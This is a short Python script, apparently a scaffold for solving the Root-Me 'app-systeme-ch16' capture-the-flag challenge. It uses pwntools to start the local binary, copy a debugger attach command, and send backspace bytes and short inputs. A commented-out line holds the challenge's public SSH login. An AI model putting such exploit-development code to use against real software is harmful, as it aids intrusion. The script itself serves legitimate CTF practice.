#!/usr/bin/env python3
from pwn import *
import os

context.log_level="debug"

#conn=ssh(host="challenge02.root-me.org", user="app-systeme-ch16", password="app-systeme-ch16", port=2222)

p = process("./ch16")
os.system(f"echo 'attach {p.pid}' | xclip -sel c")
pause()
p.sendline("\x08")
p.sendline("AA")
p.sendline("\x08")
p.sendline("BB")
p.interactive()
